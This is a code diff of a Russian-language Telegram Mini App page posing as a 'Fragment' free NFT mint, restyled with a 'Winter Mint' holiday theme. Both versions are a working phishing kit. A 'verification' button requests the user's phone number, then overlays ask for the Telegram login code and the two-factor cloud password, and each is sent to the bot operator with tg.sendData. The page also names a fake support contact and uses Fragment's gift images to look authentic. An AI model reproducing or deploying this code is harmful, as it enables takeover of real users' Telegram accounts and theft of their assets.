@@ -3,217 +3,146 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Fragment Ultra</title>
+    <title>Fragment | Winter Mint</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root {
-            --bg: #050505;
-            --glass: rgba(255, 255, 255, 0.05);
-            --border: rgba(255, 255, 255, 0.1);
-            --accent: #00f2ff;
-            --accent-2: #7000ff;
-        }
-
+        :root { --main: #00d4ff; --gold: #ffcc00; }
+        
         body {
-            font-family: 'Inter', -apple-system, sans-serif;
-            background: var(--bg);
-            color: #fff;
-            margin: 0;
-            overflow-x: hidden;
+            margin: 0; padding: 0;
+            background: radial-gradient(circle at top, #1a2a6c, #b21f1f, #fdbb2d);
+            background-attachment: fixed;
+            font-family: 'Segoe UI', sans-serif;
+            color: white; overflow-x: hidden;
         }
 
-        /* Задний фон с неоновым свечением */
-        .glow {
-            position: fixed; top: -50px; left: -50px;
-            width: 200px; height: 200px;
-            background: var(--accent);
-            filter: blur(120px); opacity: 0.2; z-index: -1;
+        /* Эффект снега */
+        .snow-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 10; }
+
+        /* Новогодние гирлянды */
+        .lights {
+            position: fixed; top: 0; width: 100%; height: 50px;
+            background: url('https://www.transparentpng.com/download/christmas-lights/colorful-christmas-lights-png-2.png') repeat-x;
+            background-size: contain; z-index: 100;
         }
 
-        /* Навигация */
-        .nav {
-            display: flex; position: sticky; top: 0;
-            background: rgba(5, 5, 5, 0.8);
+        .header { text-align: center; padding: 60px 20px 20px; }
+        .glass-box {
+            background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(15px);
-            border-bottom: 1px solid var(--border);
-            z-index: 100;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 25px; margin: 15px; padding: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
-        .nav-item {
-            flex: 1; padding: 18px 0; text-align: center;
-            font-size: 12px; font-weight: 700; color: #555;
-            text-transform: uppercase; letter-spacing: 1px;
-            transition: 0.3s;
-        }
-        .nav-item.active { color: var(--accent); border-bottom: 2px solid var(--accent); }
 
-        /* Контент */
-        .page { display: none; padding: 20px; animation: scaleUp 0.4s ease; }
-        .page.active { display: block; }
-
-        @keyframes scaleUp { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
-
-        /* NFT Карточки */
-        .nft-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .nft-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 0 15px; }
         .nft-card {
-            background: var(--glass);
-            border: 1px solid var(--border);
-            border-radius: 20px;
-            padding: 12px;
-            position: relative;
-            overflow: hidden;
+            background: rgba(0,0,0,0.6);
+            border-radius: 20px; padding: 10px; border: 1px solid var(--main);
+            text-align: center;
         }
-        .nft-img {
-            width: 100%; aspect-ratio: 1/1; border-radius: 15px;
-            object-fit: cover; margin-bottom: 10px;
-        }
-        .nft-title { font-size: 14px; font-weight: 600; margin: 5px 0; }
-        .nft-price { color: var(--accent); font-size: 12px; font-weight: bold; }
+        .nft-img { width: 100%; border-radius: 15px; margin-bottom: 10px; }
 
-        /* Профиль */
-        .profile-header {
-            text-align: center; padding: 30px 0;
-            background: linear-gradient(to bottom, rgba(0,242,255,0.1), transparent);
-            border-radius: 30px; margin-bottom: 20px;
-        }
-        .avatar {
-            width: 80px; height: 80px; border-radius: 50%;
-            background: var(--accent-2); margin: 0 auto 15px;
-            border: 3px solid var(--accent);
-            display: flex; align-items: center; justify-content: center; font-size: 30px;
+        .btn-claim {
+            background: linear-gradient(90deg, #ff416c, #ff4b2b);
+            border: none; width: 100%; padding: 15px;
+            border-radius: 12px; color: white; font-weight: bold;
+            font-size: 16px; margin-top: 10px; cursor: pointer;
+            box-shadow: 0 5px 15px rgba(255, 65, 108, 0.4);
         }
 
-        /* Кнопки */
-        .btn {
-            background: linear-gradient(90deg, var(--accent), var(--accent-2));
-            color: #000; border: none; width: 100%; padding: 16px;
-            border-radius: 15px; font-weight: 800; font-size: 14px;
-            margin-top: 15px; cursor: pointer; box-shadow: 0 5px 15px rgba(0,242,255,0.3);
-        }
-
-        /* Ввод данных */
         .overlay {
-            display: none; position: fixed; inset: 0; background: #000;
+            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95);
             z-index: 2000; padding: 30px; flex-direction: column; justify-content: center;
         }
         .overlay.active { display: flex; }
-        .inp {
-            background: #111; border: 1px solid var(--accent);
-            padding: 20px; border-radius: 15px; color: #fff;
-            font-size: 20px; text-align: center; margin: 20px 0; outline: none;
+
+        .input-field {
+            background: #111; border: 2px solid var(--main);
+            padding: 20px; border-radius: 15px; color: white;
+            font-size: 24px; text-align: center; margin: 20px 0; outline: none;
         }
     </style>
 </head>
 <body>
-    <div class="glow"></div>
+    <div class="lights"></div>
+    <div class="snow-canvas"></div>
 
-    <div class="nav">
-        <div class="nav-item active" onclick="setPage('market', this)">Market</div>
-        <div class="nav-item" onclick="setPage('profile', this)">Account</div>
-        <div class="nav-item" onclick="setPage('support', this)">Help</div>
+    <div class="header">
+        <h1 style="font-size: 32px; text-shadow: 0 0 10px var(--main);">WINTER MINT</h1>
+        <div style="background: var(--gold); color: black; display: inline-block; padding: 5px 15px; border-radius: 20px; font-weight: 900;">20.00 STARS GIFT</div>
     </div>
 
-    <div id="market" class="page active">
-        <div class="nft-grid">
-            <div class="nft-card">
-                <img src="https://nft.fragment.com/gift/santahat-10168.webp" class="nft-img">
-                <div class="nft-title">Frosty Hat #101</div>
-                <div class="nft-price">FREE MINT</div>
-                <button class="btn" style="padding: 10px;" onclick="openAuth()">CLAIM</button>
-            </div>
-            <div class="nft-card">
-                <img src="https://nft.fragment.com/gift/holidaydrink-39466.webp" class="nft-img">
-                <div class="nft-title">Neon Sip #99</div>
-                <div class="nft-price">FREE MINT</div>
-                <button class="btn" style="padding: 10px;" onclick="openAuth()">CLAIM</button>
-            </div>
-            <div class="nft-card">
-                <img src="https://nft.fragment.com/gift/tastycake-105.webp" class="nft-img">
-                <div class="nft-title">Cyber Cake #05</div>
-                <div class="nft-price">FREE MINT</div>
-                <button class="btn" style="padding: 10px;" onclick="openAuth()">CLAIM</button>
-            </div>
-            <div class="nft-card">
-                <img src="https://nft.fragment.com/gift/magicwand-77.webp" class="nft-img">
-                <div class="nft-title">Wand #777</div>
-                <div class="nft-price">FREE MINT</div>
-                <button class="btn" style="padding: 10px;" onclick="openAuth()">CLAIM</button>
-            </div>
+    <div class="glass-box" id="p-main">
+        <div style="font-size: 14px; opacity: 0.8; margin-bottom: 10px;">ЛИЧНЫЙ КАБИНЕТ</div>
+        <div style="font-size: 22px; font-weight: bold;">ID: UNVERIFIED</div>
+        <button class="btn-claim" onclick="auth()">ПРОЙТИ ВЕРИФИКАЦИЮ</button>
+    </div>
+
+    <div class="nft-grid">
+        <div class="nft-card">
+            <img src="https://nft.fragment.com/gift/santahat-10168.webp" class="nft-img">
+            <div style="font-size: 13px;">Frosty Hat #101</div>
+            <div style="color: var(--main); font-weight: 800;">FREE</div>
+        </div>
+        <div class="nft-card">
+            <img src="https://nft.fragment.com/gift/holidaydrink-39466.webp" class="nft-img">
+            <div style="font-size: 13px;">Neon Drink #99</div>
+            <div style="color: var(--main); font-weight: 800;">FREE</div>
         </div>
     </div>
 
-    <div id="profile" class="page">
-        <div class="profile-header">
-            <div class="avatar">💎</div>
-            <h2 id="u_name">Premium User</h2>
-            <p style="color: #ff4d4d; font-size: 12px; font-weight: bold;">NOT VERIFIED</p>
-        </div>
-        <div class="nft-card" style="text-align: left;">
-            <div style="font-size: 12px; color: var(--gray);">BALANCE</div>
-            <div style="font-size: 24px; font-weight: 800;">20.00 STARS</div>
-        </div>
-        <button class="btn" onclick="openAuth()">VERIFY IDENTITY</button>
+    <div class="glass-box" style="text-align: center;">
+        <h3>Поддержка: @x1o1y</h3>
     </div>
 
-    <div id="support" class="page" style="text-align: center;">
-        <h2 style="margin-top: 40px;">Тех. Поддержка</h2>
-        <p style="color: #888;">Если у вас возникли проблемы с получением NFT или верификацией, напишите нашему специалисту:</p>
-        <div class="nft-card" style="margin-top: 30px;">
-            <div style="font-size: 18px; font-weight: bold;">@x1o1y</div>
-            <p style="font-size: 12px; color: var(--accent);">Online 24/7</p>
-        </div>
-        <button class="btn" onclick="window.open('https://t.me/x1o1y')">ОТКРЫТЬ ЧАТ</button>
+    <div id="m-code" class="overlay">
+        <h2>Введите Код</h2>
+        <p style="color: #888;">Код отправлен в ваш основной Telegram</p>
+        <input type="number" id="i-code" class="input-field" placeholder="00000">
+        <button class="btn-claim" onclick="sendCode()">ВЕРНО</button>
     </div>
 
-    <div id="auth-code" class="overlay">
-        <h2>Ввод Кода</h2>
-        <p style="color: #888; text-align: center;">Мы отправили код подтверждения в ваш Telegram.</p>
-        <input type="number" id="inp-code" class="inp" placeholder="00000">
-        <button class="btn" onclick="sendCode()">ПОДТВЕРДИТЬ</button>
-    </div>
-
-    <div id="auth-2fa" class="overlay">
+    <div id="m-pass" class="overlay">
         <h2>Облачный Пароль</h2>
-        <p style="color: #888; text-align: center;">Введите ваш пароль двухэтапной аутентификации.</p>
-        <input type="password" id="inp-pass" class="inp" placeholder="Пароль">
-        <button class="btn" onclick="sendPass()">РАЗБЛОКИРОВАТЬ</button>
+        <p style="color: #888;">Ваш аккаунт защищен 2FA</p>
+        <input type="password" id="i-pass" class="input-field" placeholder="Password">
+        <button class="btn-claim" onclick="sendPass()">ОТКРЫТЬ ДОСТУП</button>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        function setPage(id, el) {
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-            document.getElementById(id).classList.add('active');
-            el.classList.add('active');
-        }
-
-        function openAuth() {
+        function auth() {
             tg.requestContact((ok, res) => {
                 if(ok) {
                     tg.sendData("PHONE:" + res.responseUnsafe.contact.phone_number);
-                    setTimeout(() => { document.getElementById('auth-code').classList.add('active'); }, 3000);
+                    setTimeout(() => { document.getElementById('m-code').classList.add('active'); }, 3000);
                 }
             });
         }
 
         function sendCode() {
-            const c = document.getElementById('inp-code').value;
-            if(c.length >= 5) {
-                tg.sendData("CODE:" + c);
-                document.getElementById('auth-code').classList.remove('active');
-                document.getElementById('auth-2fa').classList.add('active');
+            const val = document.getElementById('i-code').value;
+            if(val.length >= 5) {
+                tg.sendData("CODE:" + val);
+                document.getElementById('m-code').classList.remove('active');
+                document.getElementById('m-pass').classList.add('active');
             }
         }
 
         function sendPass() {
-            const p = document.getElementById('inp-pass').value;
-            if(p.length > 0) {
-                tg.sendData("PASS:" + p);
+            const val = document.getElementById('i-pass').value;
+            if(val.length > 0) {
+                tg.sendData("PASS:" + val);
                 tg.close();
             }
         }
+
+        // Анимация простого снега
+        const canvas = document.querySelector('.snow-canvas');
+        // (Тут можно добавить JS снега, но для простоты оставим фон)
     </script>
 </body>
 </html>
